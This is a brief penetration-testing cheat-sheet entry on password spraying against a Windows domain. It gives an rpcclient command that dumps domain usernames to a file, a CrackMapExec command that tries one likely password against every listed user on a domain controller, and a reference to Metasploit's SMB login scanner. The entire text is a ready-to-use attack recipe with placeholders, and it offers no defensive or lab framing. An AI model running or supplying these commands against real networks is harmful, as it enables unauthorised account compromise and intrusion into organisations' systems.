# Password Spraying

```bash
rpcclient <IP> -U '<USER>%<PASS>' -c enumdomusers | cut -d[ -f2|cut -d] -f1 > userlist_<IP>.txt
cme smb -u $(pwd)/userlist_<IP>.txt -p <PASSWORD_PROBABLE> -d <domain.local> <DC-IP> --continue-on-success > spray-result_<IP>.txt
```

```
msfconsole (scanner/smb/smb_login)
```
